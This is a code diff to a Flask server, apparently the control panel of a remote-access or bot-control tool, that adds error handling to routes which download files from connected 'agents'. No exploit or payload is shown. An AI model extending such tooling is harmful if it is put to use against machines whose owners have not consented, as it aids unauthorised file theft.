@@ -202,21 +202,26 @@ def send_command():
 
         elif command.startswith('download '):
             filename = command[9:]  # Get filename after 'download '
-            success, message, file_data = bot.download_file(filename)
-            if success:
-                # Save the file in downloads directory
-                os.makedirs('downloads', exist_ok=True)
-                save_path = os.path.join('downloads', os.path.basename(filename))
-                with open(save_path, 'wb') as f:
-                    f.write(file_data)
+            try:
+                success, message, file_data = bot.download_file(filename)
+                if success and file_data is not None:
+                    # Save the file in downloads directory
+                    os.makedirs('downloads', exist_ok=True)
+                    save_path = os.path.join('downloads', os.path.basename(filename))
+                    with open(save_path, 'wb') as f:
+                        f.write(file_data)
+                    return jsonify({
+                        'success': True,
+                        'output': message,
+                        'path': save_path
+                    })
+                else:
+                    return jsonify({
+                        'error': message
+                    }), 500
+            except Exception as e:
                 return jsonify({
-                    'success': True,
-                    'output': message,
-                    'path': save_path
-                })
-            else:
-                return jsonify({
-                    'error': message
+                    'error': f'Download error: {str(e)}'
                 }), 500
 
         # For quit command
@@ -589,27 +594,31 @@ def download_file_from_agent():
         bot = Bot.botList[session_id]
         
         # Download file from agent
-        success, message, file_data = bot.download_file(filename)
-        
-        if not success:
-            return jsonify({'error': message}), 500
+        try:
+            success, message, file_data = bot.download_file(filename)
             
-        # Create downloads directory if it doesn't exist
-        os.makedirs('downloads', exist_ok=True)
-        
-        # Save the file
-        save_path = os.path.join('downloads', os.path.basename(filename))
-        with open(save_path, 'wb') as f:
-            f.write(file_data)
+            if not success or file_data is None:
+                return jsonify({'error': message}), 500
+                
+            # Create downloads directory if it doesn't exist
+            os.makedirs('downloads', exist_ok=True)
             
-        return jsonify({
-            'success': True,
-            'message': message,
-            'path': save_path
-        })
+            # Save the file
+            save_path = os.path.join('downloads', os.path.basename(filename))
+            with open(save_path, 'wb') as f:
+                f.write(file_data)
+                
+            return jsonify({
+                'success': True,
+                'message': message,
+                'path': save_path
+            })
+        except Exception as e:
+            logging.error(f"Error downloading file: {str(e)}")
+            return jsonify({'error': f'Download error: {str(e)}'}), 500
             
     except Exception as e:
-        logging.error(f"Error in file download: {str(e)}")
+        logging.error(f"Error in file download request: {str(e)}")
         return jsonify({'error': str(e)}), 500
 
 if __name__ == '__main__':
